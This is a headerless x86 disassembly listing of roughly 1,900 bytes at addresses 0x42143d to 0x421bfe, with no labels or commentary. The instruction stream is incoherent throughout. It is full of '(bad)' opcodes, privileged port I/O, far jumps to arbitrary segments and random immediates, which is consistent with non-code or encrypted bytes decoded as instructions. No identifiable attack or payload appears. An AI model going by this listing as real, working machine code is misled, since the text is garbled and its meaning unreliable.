  42143d:	mov    eax,ds:0x8a7157bd
  421442:	aad    0x93
  421444:	xchg   BYTE PTR [ecx+edx*8+0x43a29c4d],bl
  42144b:	mov    ds:0xce4b562d,eax
  421450:	ret    0xa6b9
  421453:	jle    0x421437
  421455:	cmp    eax,0x81aba65a
  42145a:	cmp    ebx,DWORD PTR [ebx+0x648ef418]
  421460:	cmp    al,0x43
  421462:	das    
  421463:	fild   WORD PTR [edx-0x461aa490]
  421469:	mov    eax,DWORD PTR [esi-0x5e]
  42146c:	int3   
  42146d:	outs   dx,BYTE PTR ds:[esi]
  42146e:	shr    DWORD PTR [edx+0x441d192f],cl
  421474:	adc    al,0x78
  421476:	mov    ebp,0xc0839f3
  42147b:	mov    dl,0xd9
  42147d:	cmp    eax,0x676b4b17
  421482:	xor    al,0x6
  421484:	pushf  
  421485:	cdq    
  421486:	sbb    dl,BYTE PTR [edi]
  421488:	scas   eax,DWORD PTR es:[edi]
  421489:	push   ds
  42148a:	push   esi
  42148b:	inc    edi
  42148c:	add    bh,al
  42148e:	lods   al,BYTE PTR ds:[esi]
  42148f:	cmp    cl,bl
  421491:	cli    
  421492:	mov    BYTE PTR [ebx-0x32],dl
  421495:	je     0x42148d
  421497:	inc    ebp
  421498:	dec    edi
  421499:	and    eax,0xccaa9da0
  42149e:	lahf   
  42149f:	lahf   
  4214a0:	ror    DWORD PTR [ecx],1
  4214a2:	les    ecx,FWORD PTR [esi+eax*4+0x12]
  4214a6:	retf   0xe484
  4214a9:	mov    dl,0x2e
  4214ab:	lods   eax,DWORD PTR ds:[esi]
  4214ac:	aaa    
  4214ad:	fs xor eax,0x95e2cc68
  4214b3:	nop
  4214b4:	adc    al,BYTE PTR [edi-0x7452adb1]
  4214ba:	dec    edx
  4214bb:	add    BYTE PTR [edi+eiz*1],bh
  4214be:	cmp    dl,al
  4214c0:	ret    
  4214c1:	cmp    ebx,ebp
  4214c3:	xchg   ecx,eax
  4214c4:	aam    0x64
  4214c6:	dec    ebp
  4214c7:	dec    edi
  4214c8:	xor    ebp,DWORD PTR [edx]
  4214ca:	mov    ds:0x909f8f19,eax
  4214cf:	push   edx
  4214d0:	gs sti 
  4214d2:	dec    ecx
  4214d3:	rcl    BYTE PTR [ecx-0x4d36c6e3],cl
  4214d9:	call   0x8ca50dde
  4214de:	(bad)  
  4214df:	icebp  
  4214e0:	mov    edi,0xa441c622
  4214e5:	data16 and dl,BYTE PTR [eax-0x5fe6239f]
  4214ec:	stc    
  4214ed:	pop    ds
  4214ee:	shr    BYTE PTR [edi],cl
  4214f0:	xchg   esi,eax
  4214f1:	(bad)  
  4214f2:	xchg   esp,eax
  4214f3:	sub    eax,0xae9a2276
  4214f8:	or     ebx,esi
  4214fa:	sub    BYTE PTR [ebp+0x2ebf62ec],bl
  421500:	push   esi
  421501:	sar    BYTE PTR [edx],1
  421503:	inc    eax
  421504:	imul   ecx,DWORD PTR [edi-0x50e68790],0x5a17ec3c
  42150e:	fistp  DWORD PTR [ebp-0x58dcf692]
  421514:	cli    
  421515:	test   DWORD PTR [ebp-0x14],esi
  421518:	out    dx,eax
  421519:	mov    ecx,0x8af78f99
  42151e:	adc    ecx,esp
  421520:	pop    edi
  421521:	daa    
  421522:	jmp    0x421587
  421524:	rol    BYTE PTR [ecx+0x10],cl
  421527:	pop    edi
  421528:	sub    esp,0x3b
  42152b:	and    eax,0x3488f2fc
  421530:	pop    ss
  421531:	inc    ebp
  421532:	lods   al,BYTE PTR ds:[esi]
  421533:	xor    BYTE PTR [ebp-0xc],bh
  421536:	jl     0x4214c8
  421538:	gs (bad) 
  42153a:	push   ecx
  42153b:	mov    eax,0x62e9488
  421540:	xchg   esp,eax
  421541:	aad    0x8b
  421543:	pop    ds
  421544:	sbb    al,BYTE PTR [ebp-0x1a]
  421547:	retf   0xd668
  42154a:	test   eax,0xf1d0d27d
  42154f:	and    BYTE PTR [esi],ah
  421551:	gs jl  0x421530
  421554:	sbb    edi,DWORD PTR [edx+0x7a9b31ea]
  42155a:	push   eax
  42155b:	data16 shr BYTE PTR ds:[eax+edx*8-0x24],0xe3
  421562:	fistp  QWORD PTR [edx+0xc]
  421565:	imul   ebx,ebx,0x5e
  421568:	and    eax,0x3437f63a
  42156d:	add    dl,BYTE PTR [edi-0x343eedd6]
  421573:	and    DWORD PTR [esi+eiz*8-0x4af1b9f3],eax
  42157a:	daa    
  42157b:	and    BYTE PTR [esi],cl
  42157d:	or     dl,dl
  42157f:	ins    BYTE PTR es:[edi],dx
  421580:	mov    ds:0x66dbb10a,al
  421585:	adc    BYTE PTR [esi],ah
  421587:	repz xor eax,0x17cfcf07
  42158d:	clc    
  42158e:	outs   dx,BYTE PTR ds:[esi]
  42158f:	cmp    DWORD PTR [eax-0x39],0xcb2eb9b
  421596:	test   esi,0xe2ef8ee4
  42159c:	mov    esp,0xba6c61ac
  4215a1:	xchg   DWORD PTR [eax+0x53],esp
  4215a4:	pop    ebp
  4215a5:	pop    edx
  4215a6:	mov    ds:0x43e7c9da,al
  4215ab:	and    DWORD PTR [esi+0x24],edx
  4215ae:	jg     0x42154a
  4215b0:	jb     0x4215af
  4215b2:	inc    ebp
  4215b3:	es das 
  4215b5:	mov    ebx,fs
  4215b7:	loopne 0x421626
  4215b9:	sub    ecx,DWORD PTR [edi]
  4215bb:	pop    esi
  4215bc:	mov    dh,0xdf
  4215be:	mov    esp,0x67b7a8b8
  4215c3:	das    
  4215c4:	and    bl,cl
  4215c6:	cmp    BYTE PTR [ebp-0x270df6f3],bh
  4215cc:	or     eax,0xb3c051c5
  4215d1:	inc    edi
  4215d2:	mov    al,ds:0x11ac6656
  4215d7:	fsubr  DWORD PTR [edx-0x538ddb36]
  4215dd:	test   BYTE PTR [ebx],bh
  4215df:	jne    0x421613
  4215e1:	loope  0x42158f
  4215e3:	lahf   
  4215e4:	sahf   
  4215e5:	inc    eax
  4215e6:	add    eax,0xafa6cef5
  4215eb:	mov    ebx,DWORD PTR [edx-0x2f]
  4215ee:	push   cs
  4215ef:	(bad)  
  4215f0:	out    dx,al
  4215f1:	or     DWORD PTR [esp+ebx*1+0x1f],ebx
  4215f5:	cwde   
  4215f6:	cmp    ebp,esi
  4215f8:	int3   
  4215f9:	inc    esp
  4215fa:	jg     0x421609
  4215fc:	test   BYTE PTR [eax],ah
  4215fe:	mov    ds:0xb5bcafb0,eax
  421603:	dec    ebp
  421604:	xor    dl,BYTE PTR [edi-0x1f]
  421607:	ror    DWORD PTR [eax+0x3b2b45a3],cl
  42160d:	test   eax,0xf194a764
  421612:	pop    esi
  421613:	dec    ebp
  421614:	xor    dh,BYTE PTR [edi+0x22c1655c]
  42161a:	sbb    eax,0x702adf25
  42161f:	pop    esp
  421620:	and    DWORD PTR [edx-0x67ffdfe],ebp
  421626:	retf   0xc12f
  421629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42162a:	push   ebx
  42162b:	lods   al,BYTE PTR ds:[esi]
  42162c:	aaa    
  42162d:	pushf  
  42162e:	mov    edx,0x329e5c93
  421633:	mov    bl,0x10
  421635:	mov    edx,0x38ee2a1e
  42163a:	test   bh,ch
  42163c:	jne    0x4215d8
  42163e:	fld    DWORD PTR [eax]
  421640:	loope  0x4216b5
  421642:	fild   WORD PTR [eax-0x46]
  421645:	jecxz  0x421674
  421647:	cwde   
  421648:	mov    dh,0x37
  42164a:	in     eax,dx
  42164b:	(bad)  
  42164c:	aam    0x57
  42164e:	cmp    BYTE PTR [edx],ch
  421650:	gs cmp al,0xde
  421653:	pop    eax
  421655:	push   esi
  421656:	loop   0x4215e1
  421658:	lds    esi,FWORD PTR [ecx-0x2e63868d]
  42165e:	fld    QWORD PTR [esi]
  421660:	jno    0x421669
  421662:	fsubr  QWORD PTR [eax-0x6d]
  421665:	add    BYTE PTR [esi-0x6a],cl
  421668:	cmp    al,0xe0
  42166a:	and    DWORD PTR [ebx],esp
  42166c:	nop
  42166d:	loop   0x42162b
  42166f:	mov    ebp,DWORD PTR ds:0xf4e8dfbc
  421675:	inc    edi
  421676:	sbb    eax,0xb31c66f1
  42167b:	pop    eax
  42167c:	sbb    ebp,DWORD PTR es:[esi+0x34]
  421680:	mov    esp,0xa1d3c39f
  421685:	cmp    DWORD PTR [ebp+0x2d],ecx
  421688:	jno    0x4216e7
  42168a:	jl     0x42166d
  42168c:	jbe    0x4216fe
  42168e:	jo     0x421663
  421690:	dec    ecx
  421691:	ret    0x1618
  421694:	push   edx
  421695:	fisub  WORD PTR [esi+0x9]
  421698:	jle    0x4216c4
  42169a:	nop
  42169b:	pop    es
  42169c:	rol    DWORD PTR [ecx-0x26231634],cl
  4216a2:	lods   al,BYTE PTR ds:[esi]
  4216a3:	adc    ah,BYTE PTR [edi]
  4216a5:	xor    al,0xad
  4216a7:	iret   
  4216a8:	pop    edi
  4216a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216aa:	sub    BYTE PTR [ebp+0x51461277],bh
  4216b0:	sbb    dh,cl
  4216b2:	xchg   BYTE PTR [esi+edi*4-0x87fc999],cl
  4216b9:	jmp    0x399a8e74
  4216be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216bf:	pop    edi
  4216c0:	sub    dh,BYTE PTR [edi-0x1d703e47]
  4216c6:	imul   edx,DWORD PTR [ecx],0xffffff96
  4216c9:	les    ecx,FWORD PTR [esi+0x4fe7c4f6]
  4216cf:	and    edi,esi
  4216d1:	inc    ecx
  4216d2:	shr    dh,1
  4216d4:	arpl   di,di
  4216d6:	cmp    BYTE PTR [edi+0x2345f415],bl
  4216dc:	(bad)  
  4216de:	and    eax,0x655ca554
  4216e3:	ret    0xe784
  4216e6:	leave  
  4216e7:	and    esp,esp
  4216e9:	daa    
  4216ea:	sbb    eax,0xa8a5b031
  4216ef:	aaa    
  4216f0:	mov    ebp,DWORD PTR [edx+0x5f]
  4216f3:	pop    eax
  4216f4:	add    al,bl
  4216f6:	ins    DWORD PTR es:[edi],dx
  4216f7:	push   es
  4216f8:	mov    bl,0x45
  4216fa:	aam    0xca
  4216fc:	jmp    0x2794:0x69ccc8b7
  421703:	or     al,0xb6
  421705:	(bad)  
  421706:	dec    eax
  421707:	mov    al,ds:0xf91db6bf
  42170c:	jae    0x4216ef
  42170e:	adc    BYTE PTR [ebx+ebx*8+0x3e],ch
  421712:	loopne 0x4216fb
  421714:	mov    ebp,0xe29175f7
  421719:	call   FWORD PTR [ecx+0x2f]
  42171c:	(bad)  
  42171d:	lods   eax,DWORD PTR ds:[esi]
  42171e:	(bad)  
  42171f:	jge    0x4216d4
  421721:	sti    
  421722:	loop   0x421773
  421724:	mov    cl,0x8c
  421726:	retf   
  421727:	inc    eax
  421728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421729:	pop    ebp
  42172a:	aaa    
  42172b:	mov    ebx,DWORD PTR [ecx]
  42172d:	(bad)  
  42172e:	in     al,dx
  42172f:	mov    esp,0xaaf538b2
  421734:	cdq    
  421735:	in     al,dx
  421736:	fidivr WORD PTR [esi]
  421738:	push   eax
  421739:	push   ebp
  42173a:	xchg   ebx,eax
  42173b:	pop    esp
  42173c:	nop
  42173d:	push   ebx
  42173e:	jns    0x4217b4
  421740:	sub    ebx,DWORD PTR [esp+ebp*2+0x52]
  421744:	(bad)  [eax]
  421746:	and    BYTE PTR [ecx+0x5230ecc5],0x30
  42174d:	mov    ebp,0x5ca596f2
  421752:	inc    esp
  421753:	dec    ecx
  421754:	in     al,dx
  421755:	pusha  
  421756:	iret   
  421757:	iret   
  421758:	xchg   esi,eax
  421759:	push   0x55b1e981
  42175e:	divps  xmm1,XMMWORD PTR [ecx+0x5c]
  421762:	aas    
  421763:	push   cs
  421764:	(bad)  
  421765:	mov    ds:0x5b9d3b73,al
  42176a:	(bad)  
  42176b:	push   esp
  42176c:	and    DWORD PTR [edi+ebx*2],ecx
  42176f:	push   esi
  421770:	xor    edi,ebp
  421772:	mov    ch,0x7
  421774:	fwait
  421775:	xchg   edi,eax
  421776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421777:	iret   
  421778:	(bad)  
  421779:	bound  edi,QWORD PTR [ecx+0x14]
  42177c:	xchg   edi,eax
  42177d:	pop    ss
  42177e:	pusha  
  42177f:	popf   
  421780:	pop    ecx
  421781:	jne    0x421727
  421783:	jne    0x42171c
  421785:	mov    edi,0x39f0c6ff
  42178a:	inc    esp
  42178b:	int3   
  42178c:	nop
  42178d:	dec    edi
  42178e:	xchg   ecx,eax
  42178f:	repz jmp 0x65e5cfe4
  421795:	mov    edi,0x55c1e71e
  42179a:	jmp    0x553beb6f
  42179f:	xor    ebx,DWORD PTR [edx]
  4217a1:	aam    0x54
  4217a3:	mov    esp,0xcbef851a
  4217a8:	dec    eax
  4217a9:	jp     0x421805
  4217ab:	mov    al,0x7
  4217ad:	cs aaa 
  4217af:	mov    BYTE PTR [esi+ebx*8-0x4066cac9],dl
  4217b6:	ret    
  4217b7:	or     BYTE PTR [esi],cl
  4217b9:	test   eax,0x93b81d3d
  4217be:	and    ebp,DWORD PTR [esi-0x7d57bf50]
  4217c4:	les    esp,FWORD PTR ds:[esi-0x68]
  4217c8:	dec    edx
  4217c9:	add    dh,BYTE PTR [ebx]
  4217cb:	das    
  4217cc:	inc    edx
  4217cd:	shl    BYTE PTR [edx],1
  4217cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217d0:	mov    ch,0xcb
  4217d2:	rcr    dl,cl
  4217d4:	inc    esp
  4217d5:	dec    eax
  4217d6:	imul   ebx,DWORD PTR [edi],0x43b6e8fd
  4217dc:	push   ds
  4217dd:	stos   DWORD PTR es:[edi],eax
  4217de:	lods   al,BYTE PTR ds:[esi]
  4217df:	jne    0x4217cf
  4217e1:	scas   al,BYTE PTR es:[edi]
  4217e2:	adc    dl,bl
  4217e4:	push   edx
  4217e5:	std    
  4217e6:	inc    esp
  4217e7:	jp     0x4217fd
  4217e9:	mov    dh,0xc9
  4217eb:	xchg   BYTE PTR [edx],bl
  4217ed:	shl    BYTE PTR [esi-0x2127e11],0xde
  4217f4:	gs outs dx,BYTE PTR ds:[si]
  4217f8:	pop    edi
  4217f9:	neg    BYTE PTR [edx-0x1b483354]
  4217ff:	dec    ebx
  421800:	aaa    
  421801:	stc    
  421802:	pop    ecx
  421803:	pcmpgtw mm2,QWORD PTR [edi]
  421806:	xor    eax,0xe96d77c9
  42180b:	pop    edx
  42180c:	xor    eax,0xb6824fd
  421811:	loopne 0x4217a5
  421813:	jl     0x4217f2
  421815:	out    dx,eax
  421816:	sbb    BYTE PTR [esi],0xa3
  421819:	and    esp,DWORD PTR [ebp+edi*1-0x51]
  42181d:	mov    esi,DWORD PTR [ebp-0xf716c33]
  421823:	or     dh,cl
  421825:	repz sbb al,0x6f
  421828:	mov    ah,0xe
  42182a:	ret    
  42182b:	jne    0x4217de
  42182d:	rcr    BYTE PTR [eax+0x31c5be76],1
  421833:	rcl    dl,0xc4
  421836:	sub    esi,DWORD PTR [eax-0x1a]
  421839:	pop    ss
  42183a:	sub    DWORD PTR ds:0x63a579a1,edi
  421840:	cmp    ah,BYTE PTR [eax]
  421842:	dec    eax
  421843:	jo     0x4217dc
  421845:	mov    ebp,0xddb21436
  42184a:	and    ebp,DWORD PTR ds:0xc4254524
  421850:	inc    ebx
  421851:	dec    DWORD PTR [edi]
  421853:	popa   
  421854:	lods   al,BYTE PTR ds:[esi]
  421855:	repnz pop edx
  421857:	push   0x4e
  421859:	inc    ebx
  42185a:	sub    DWORD PTR [eax+edx*2+0x74095009],ebx
  421861:	jl     0x42184f
  421863:	data16 dec BYTE PTR [eax]
  421866:	xchg   ebx,eax
  421867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421868:	or     al,0x75
  42186a:	sbb    al,BYTE PTR [ebp+0x3d2b3181]
  421870:	dec    ebp
  421871:	sbb    eax,ebp
  421873:	add    DWORD PTR [ecx],eax
  421875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421876:	xchg   ecx,eax
  421877:	loop   0x4218ae
  421879:	pushf  
  42187a:	xchg   esp,ebx
  42187c:	imul   ebx,ebp,0x4092ed3c
  421882:	sbb    eax,0xfc46e340
  421888:	sub    DWORD PTR [esi-0x50474b02],ebx
  42188e:	mov    ecx,ebp
  421890:	dec    ebp
  421891:	scas   eax,DWORD PTR es:[edi]
  421892:	cmp    BYTE PTR [esi],al
  421894:	ins    BYTE PTR es:[edi],dx
  421895:	pop    ss
  421896:	pop    ebx
  421897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421898:	adc    eax,0x3546c6db
  42189d:	or     BYTE PTR [ebp-0x9dda9a9],dh
  4218a3:	lea    ebx,[ebx]
  4218a5:	fstp   QWORD PTR [ebx+0x1df9c16f]
  4218ab:	fistp  DWORD PTR [ecx+edi*1]
  4218ae:	jbe    0x421833
  4218b0:	(bad)  
  4218b1:	out    dx,eax
  4218b2:	sub    dh,BYTE PTR [eax]
  4218b4:	inc    edx
  4218b5:	push   0xffffff81
  4218b7:	pop    edi
  4218b8:	mov    ds:0xf40c5b90,al
  4218bd:	and    eax,0x34d986e3
  4218c2:	add    al,0xd
  4218c4:	mov    ah,0x19
  4218c6:	xchg   DWORD PTR [ebx+0x769e4907],eax
  4218cc:	mov    ds:0x3b53f788,al
  4218d1:	adc    BYTE PTR [edx-0x59da1984],dh
  4218d7:	sub    eax,0x95b6dcd0
  4218dc:	mov    ecx,0xf567606a
  4218e1:	inc    esi
  4218e2:	addr16 call 0x5479616a
  4218e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218e9:	dec    esp
  4218ea:	inc    esi
  4218eb:	xor    BYTE PTR [ecx+0x3889db78],al
  4218f1:	jae    0x421891
  4218f3:	out    0xbf,al
  4218f5:	mov    ecx,0xe7288b75
  4218fa:	and    BYTE PTR [ecx-0x5d9e665c],bh
  421900:	int3   
  421901:	or     eax,0x332633b1
  421906:	jp     0x4218ee
  421908:	adc    al,ch
  42190a:	sub    DWORD PTR [eax-0xc],ebp
  42190d:	popw   es
  42190f:	xlat   BYTE PTR ds:[ebx]
  421910:	sub    BYTE PTR [edx-0x1b],al
  421913:	(bad)  
  421914:	(bad)  [esi+edi*2]
  421917:	daa    
  421918:	push   ebp
  421919:	daa    
  42191a:	pop    ebx
  42191b:	pusha  
  42191c:	fs push esp
  42191e:	mov    al,ds:0xd24b5845
  421923:	dec    esi
  421924:	jmp    0x4776:0x5ce5cf60
  42192b:	cmp    DWORD PTR [esi-0x7c],0x1e773687
  421932:	cmp    eax,0xd5b3fc04
  421937:	int3   
  421938:	stos   DWORD PTR es:[edi],eax
  421939:	dec    ebp
  42193a:	xchg   edi,eax
  42193b:	and    BYTE PTR [ecx],ah
  42193d:	in     eax,dx
  42193e:	ins    DWORD PTR es:[edi],dx
  42193f:	scas   al,BYTE PTR es:[edi]
  421940:	nop
  421941:	ret    0x9658
  421944:	lock outs dx,DWORD PTR ds:[esi]
  421946:	std    
  421947:	iret   
  421948:	xchg   esi,esi
  42194a:	mov    gs,WORD PTR [ebx+0x3c]
  42194d:	pop    es
  42194e:	outs   dx,BYTE PTR cs:[esi]
  421950:	mov    ah,0xad
  421952:	add    DWORD PTR [ebp+0x22c9fe7b],0x907b08b6
  42195c:	pushf  
  42195d:	xlat   BYTE PTR ds:[ebx]
  42195e:	inc    esp
  42195f:	adc    eax,0x2166ba31
  421964:	fs std 
  421966:	scas   al,BYTE PTR es:[edi]
  421967:	fld    st(6)
  421969:	addr16 mov edi,0xbaa0cb9f
  42196f:	adc    DWORD PTR [eax-0x2b],edi
  421972:	mov    edi,0xc1e0f6c7
  421977:	cmp    BYTE PTR [esi+0x45],dh
  42197a:	and    ecx,DWORD PTR [esi-0x65]
  42197d:	lods   eax,DWORD PTR ds:[esi]
  42197e:	push   ds
  42197f:	out    0xe3,al
  421981:	stc    
  421982:	jle    0x4219b6
  421984:	clc    
  421985:	jmp    0x172e:0x329f6b5b
  42198c:	jge    0x4219bd
  42198e:	push   ds
  42198f:	test   BYTE PTR [edx],ah
  421991:	setb   BYTE PTR [esi+0x29]
  421995:	in     al,0x88
  421997:	pop    edx
  421998:	shl    DWORD PTR [edx],1
  42199a:	aad    0x99
  42199c:	enter  0xb586,0xb9
  4219a0:	int    0xfa
  4219a2:	cmp    ah,dl
  4219a4:	inc    ecx
  4219a5:	std    
  4219a6:	inc    ebx
  4219a7:	adc    ah,BYTE PTR [ebx-0x749ea9ba]
  4219ad:	sub    bh,BYTE PTR [edx-0x2]
  4219b0:	sbb    edi,DWORD PTR [ecx+esi*8+0x2]
  4219b4:	jmp    0x933dd632
  4219b9:	xor    al,0xb3
  4219bb:	in     al,0xec
  4219bd:	sbb    eax,0x7c9cd0d5
  4219c2:	shl    BYTE PTR [eax-0x7ecf370b],cl
  4219c8:	dec    ebp
  4219c9:	lods   eax,DWORD PTR ds:[esi]
  4219ca:	(bad)  
  4219cb:	sbb    ecx,esi
  4219cd:	fs push ss
  4219cf:	rcr    BYTE PTR cs:0x48dc2cab,1
  4219d6:	mov    edx,0x3a007da8
  4219db:	in     al,dx
  4219dc:	outs   dx,DWORD PTR ds:[esi]
  4219dd:	test   DWORD PTR [ecx+0x578aa0d0],edi
  4219e3:	adc    DWORD PTR [ebx-0x3],0xd3d35c5f
  4219ea:	push   0xda65a421
  4219ef:	loop   0x42199e
  4219f1:	mov    eax,ds:0x1ea62e50
  4219f6:	out    dx,eax
  4219f7:	or     esi,DWORD PTR [ebp+0xb]
  4219fa:	mov    eax,0x932fa329
  4219ff:	sbb    bh,bl
  421a01:	aam    0x89
  421a03:	loop   0x421a2c
  421a05:	pusha  
  421a06:	ss inc ecx
  421a08:	add    eax,0x406b971d
  421a0d:	or     eax,0x691b5496
  421a12:	adc    cl,0x97
  421a15:	add    ch,BYTE PTR [ecx]
  421a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a18:	sbb    DWORD PTR [ecx],esi
  421a1a:	rcl    DWORD PTR [ecx],0x5c
  421a1d:	mov    al,ds:0x8ce5e1ca
  421a22:	push   edx
  421a23:	ror    BYTE PTR [ebp+0x5e],cl
  421a26:	dec    eax
  421a27:	push   eax
  421a28:	fadd   QWORD PTR [edx+0x50191913]
  421a2e:	cmp    DWORD PTR [esi-0x5],0xffffff9a
  421a32:	icebp  
  421a33:	ret    0xdd1b
  421a36:	or     BYTE PTR [edi-0xe],0x84
  421a3a:	cdq    
  421a3b:	or     eax,0x404e467b
  421a40:	clc    
  421a41:	cld    
  421a42:	mov    ch,0x9a
  421a44:	ffree  st(0)
  421a46:	jp     0x421a64
  421a48:	fs loop 0x4219d0
  421a4b:	ins    DWORD PTR es:[edi],dx
  421a4c:	jg     0x4219fd
  421a4e:	dec    esi
  421a4f:	push   ebp
  421a50:	adc    DWORD PTR [eax],ebx
  421a52:	mov    al,ds:0xb0131dbb
  421a57:	sbb    DWORD PTR [eax],0xec64dd61
  421a5d:	aad    0x57
  421a5f:	mov    eax,ds:0x7804ad02
  421a64:	lahf   
  421a65:	int3   
  421a66:	popf   
  421a67:	sub    ch,ch
  421a69:	mov    esi,edi
  421a6b:	mov    gs,WORD PTR [ebp+0x70263bc6]
  421a71:	test   al,0x22
  421a73:	leave  
  421a74:	in     al,dx
  421a75:	lods   al,BYTE PTR ds:[esi]
  421a76:	in     al,0xb3
  421a78:	ins    BYTE PTR es:[edi],dx
  421a79:	out    dx,al
  421a7a:	dec    eax
  421a7b:	addr16 ds mov ebp,0x1a7d8783
  421a82:	dec    esp
  421a83:	pop    ecx
  421a84:	jmp    0x9ffb:0x3a64845c
  421a8b:	ret    0x50b9
  421a8e:	mov    esp,0x4971d8d
  421a93:	xchg   esp,eax
  421a95:	(bad)  
  421a97:	cs mov edx,0x496ab874
  421a9d:	xor    al,0x80
  421a9f:	xor    ecx,ecx
  421aa1:	lods   eax,DWORD PTR ds:[esi]
  421aa2:	repnz or ebp,ebx
  421aa5:	shl    BYTE PTR [edi+0x58],0xdb
  421aa9:	int    0xaf
  421aab:	sbb    al,bl
  421aad:	enter  0x9801,0xe2
  421ab1:	xchg   ebp,eax
  421ab2:	mov    ah,0xb5
  421ab4:	stos   DWORD PTR es:[edi],eax
  421ab5:	add    DWORD PTR [eax+0x7d],ebx
  421ab8:	jmp    0x421a6d
  421aba:	rcl    BYTE PTR [ebp-0x28],1
  421abd:	cmp    DWORD PTR [ebx],ecx
  421abf:	xchg   edx,eax
  421ac0:	mov    bh,0x8a
  421ac2:	pop    ss
  421ac3:	adc    DWORD PTR [edx],edi
  421ac5:	cmp    eax,0x8272579b
  421aca:	xchg   esp,eax
  421acb:	std    
  421acc:	scas   eax,DWORD PTR es:[edi]
  421acd:	xlat   BYTE PTR ds:[ebx]
  421ace:	and    eax,0xc9d724a6
  421ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ad4:	xor    DWORD PTR [ecx],edx
  421ad6:	mov    edi,0xa6442580
  421adb:	bound  edi,QWORD PTR ds:0xd7676f1d
  421ae1:	repnz pop ebx
  421ae3:	aad    0xd3
  421ae5:	mov    ch,0x60
  421ae7:	lods   al,BYTE PTR ds:[esi]
  421ae8:	push   eax
  421ae9:	jmp    DWORD PTR [ebx-0x69]
  421aec:	mov    esi,0x618c3ce6
  421af1:	xchg   bl,ah
  421af3:	mov    ah,0x22
  421af5:	lea    ebp,[ebp-0x25]
  421af8:	scas   eax,DWORD PTR es:[edi]
  421af9:	dec    esi
  421afa:	mov    WORD PTR [ebp+0x723050c1],?
  421b00:	(bad)  
  421b01:	(bad)  
  421b02:	not    DWORD PTR [esi+0x16]
  421b05:	or     BYTE PTR [ecx+0x5b],ah
  421b08:	mov    al,0x0
  421b0a:	ins    DWORD PTR es:[edi],dx
  421b0b:	dec    ebx
  421b0c:	fcmovne st,st(6)
  421b0e:	or     al,0xbb
  421b10:	sbb    eax,0xca781303
  421b15:	pop    ecx
  421b16:	sbb    ch,BYTE PTR [eax+0x1e224004]
  421b1c:	mov    ch,0xbf
  421b1e:	pop    ebp
  421b1f:	shr    ah,1
  421b21:	push   es
  421b22:	mov    ecx,0xa5fdbcb6
  421b27:	sub    DWORD PTR [esi+0x5f],ebp
  421b2a:	hlt    
  421b2b:	push   ecx
  421b2c:	jbe    0x421b31
  421b2e:	idiv   DWORD PTR [ebx]
  421b30:	inc    DWORD PTR ds:[edi-0x50]
  421b34:	xlat   BYTE PTR ds:[ebx]
  421b35:	bound  esi,QWORD PTR [ebp+0x166ef215]
  421b3b:	push   esi
  421b3c:	imul   eax,DWORD PTR [eax-0xb],0xffffff8a
  421b40:	lea    esp,[edx+0x1fb12ab4]
  421b46:	fdivr  QWORD PTR [ebx]
  421b48:	aam    0xfd
  421b4a:	cwde   
  421b4b:	or     BYTE PTR [ecx],0xd3
  421b4e:	and    esi,DWORD PTR [esi-0x37]
  421b51:	shl    DWORD PTR [ecx+eax*4-0x16],cl
  421b55:	dec    eax
  421b56:	mov    dh,0xf3
  421b58:	(bad)  
  421b59:	sbb    dh,bl
  421b5b:	(bad)  
  421b5c:	je     0x421b4f
  421b5e:	nop
  421b5f:	sbb    DWORD PTR [esi-0x37],edi
  421b62:	and    eax,0xf429867c
  421b67:	ror    bl,cl
  421b69:	icebp  
  421b6a:	and    eax,0x4f3f5839
  421b6f:	xor    eax,0xe6f89dbf
  421b74:	adc    BYTE PTR [ebx+0x43],ah
  421b77:	outs   dx,BYTE PTR ds:[esi]
  421b78:	int3   
  421b79:	jecxz  0x421b12
  421b7b:	push   esp
  421b7c:	stos   DWORD PTR es:[edi],eax
  421b7d:	add    eax,0x81228071
  421b82:	pop    ss
  421b83:	xchg   esp,eax
  421b84:	call   0xa9a6efc6
  421b89:	(bad)  
  421b8a:	clc    
  421b8b:	fdivr  DWORD PTR [ecx+0x74]
  421b8e:	dec    ebp
  421b8f:	push   0x79ddb2b
  421b94:	retf   
  421b95:	mov    esi,0xad101480
  421b9a:	mov    ebx,0x18e52a33
  421b9f:	jbe    0x421ba2
  421ba1:	sbb    BYTE PTR [esi],ch
  421ba3:	dec    eax
  421ba4:	adc    bl,BYTE PTR [ecx+0x1]
  421ba7:	jp     0x421ba2
  421ba9:	fild   WORD PTR [esi]
  421bab:	test   edx,eax
  421bad:	cs cdq 
  421baf:	push   es
  421bb0:	xchg   esi,eax
  421bb1:	mov    esi,0x25e512ef
  421bb6:	push   edx
  421bb7:	cdq    
  421bb8:	add    ch,ah
  421bba:	dec    esi
  421bbb:	shr    DWORD PTR [esi+0x7e],0xde
  421bbf:	gs retf 
  421bc1:	rol    DWORD PTR [edi+0x6c3ae4f2],0xed
  421bc8:	cmp    cl,BYTE PTR [ebp+0x624a5a4a]
  421bce:	out    dx,eax
  421bcf:	and    DWORD PTR [ecx-0x7c],edi
  421bd2:	sub    DWORD PTR [edi+ebx*2+0x5eb6c0ca],edx
  421bd9:	test   DWORD PTR [edx],ebp
  421bdb:	jns    0x421c1a
  421bdd:	fsub   DWORD PTR [esi+0xfbb52b6]
  421be3:	or     DWORD PTR [eax+0x8],ecx
  421be6:	outs   dx,BYTE PTR ds:[esi]
  421be7:	mov    cl,0xda
  421be9:	jle    0x421be2
  421beb:	iret   
  421bec:	jbe    0x421ba5
  421bee:	xlat   BYTE PTR ds:[ebx]
  421bef:	(bad)  
  421bf0:	push   esi
  421bf1:	jp     0x421c51
  421bf3:	jae    0x421c21
  421bf5:	dec    esp
  421bf6:	popf   
  421bf7:	xchg   ebx,eax
  421bf8:	xchg   ebp,eax
  421bf9:	stos   DWORD PTR es:[edi],eax
  421bfa:	leave  
  421bfb:	std    
  421bfc:	or     al,0xc3
  421bfe:	lahf   
